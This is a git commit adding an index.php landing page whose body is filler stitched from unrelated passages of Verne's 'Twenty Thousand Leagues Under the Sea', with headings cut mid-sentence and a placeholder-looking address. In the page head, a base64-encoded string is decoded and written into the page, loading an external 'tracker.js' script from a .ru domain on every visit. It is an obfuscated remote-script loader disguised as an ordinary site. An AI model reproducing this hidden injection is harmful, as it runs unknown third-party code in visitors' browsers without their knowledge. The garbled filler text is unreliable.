7a3c3eab2910534a2e85ad574d91f4ccbb430111
xxqueajf <75684520+xxqueajf@users.noreply.github.com>
2020-12-08 17:09:38 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>I continued my work, but the temperature rose to such a</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9seHdyZG13ZmpqZHMiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header>
+		<nav>
+			<li><a href="#">Home</a></li>
+			<li><a href="#">Products</a></li>
+			<li><a href="#">About</a></li>
+			<li><a href="#">Contacts</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>I continued my work, but the temperature rose to such a</h1>
+	</section>
+
+
+	<section class="our-work">
+		<h3 class="title">Hold well on.</h3>
+		<p>Profiting by this, I and my two companions went up on to the deserted platform. Before us was the steersman's cage, and I expected that Captain Nemo was there directing the course of the Nautilus. I had before me the excellent charts of the Strait of Torres, made out by the hydrographical engineer Vincendon Dumoulin. These and Captain King's are the best charts that clear the intricacies of this strait, and I consulted them attentively. Round the Nautilus the sea dashed furiously. The course of the waves, that went from southeast to northwest at the rate of two and a half miles, broke on the coral that showed itself here and there. I mean that I shall take you with me when I leave this infernal Nautilus.  That seems to me exaggeration. These creatures are only bal?nopterons, provided with dorsal fins; and, like the cachalots, are generally much smaller than the Greenland whale. Our speed was now twenty-five miles an hour. It may be well understood that Ned Land, to his great disgust, was obliged to renounce his intended flight. He could not launch the pinnace, going at the rate of twelve or thirteen yards every second. To quit the Nautilus under such conditions would be as bad as jumping from a train going at full speed-an imprudent thing, to say the least of it. Besides, our vessel only mounted to the surface of the waves at night to renew its stock of air; it was steered entirely by the compass and the log.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work">
+		<h3 class="title">Excellent! said Ned Land.</h3>
+		<p>Suppose we do not return to the Nautilus this evening? said Conseil. It was thus that, either by overloading her reservoirs, or by descending obliquely by means of her inclined planes the Nautilus successively attained the depth of three, four, five, seven, nine, and ten thousand yards, and the definite result of this experience was, that the sea preserved an average temperature of four degrees and a half, at a depth of five thousand fathoms, under all latitudes. Yes; a subterranean passage, which I have named the Arabian Tunnel. It takes us beneath Suez, and opens into the Gulf of Pelusium. Here, M. Aronnax, are the several dimensions of the boat you are in. It is an elongated cylinder with conical ends. It is very like a cigar in shape, a shape already adopted in London in several constructions of the same sort. The length of this cylinder, from stem to stern, is exactly 232 feet, and its maximum breadth is twenty-six feet. It is not built quite like your long-voyage steamers, but its lines are sufficiently long, and its curves prolonged enough, to allow the water to slide off easily, and oppose no obstacle to its passage. These two dimensions enable you to obtain by a simple calculation the surface and cubic contents of the Nautilus. Its area measures 6,032 feet; and its contents about 1,500 cubic yards; that is to say, when completely immersed it displaces 50,000 feet of water, or weighs 1,500 tons.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="title">But, at this moment, the Nautilus, raised by the last waves of </h3>	
+		<p>We agreed to wait for an opportunity, continued Ned Land, and the opportunity has arrived. This night we shall be but a few miles from the Spanish coast. It is cloudy. The wind blows freely. I have your word, M. Aronnax, and I rely upon you. No, sir; it is evidently a gigantic narwhal, and an electric one. By the bye, M. Aronnax, you are not afraid of sharks? It might be the right of a savage, I answered, but not that of a civilized man.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="Email">
+			<input type="Name" placeholder="Name">
+			<input type="Surmane" placeholder="Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>848 Hermann Branch, Apt. 174, 90354-9520, West Markus, Kentucky, United States</p>
+	</footer>
+
+</body>
+
+</html>
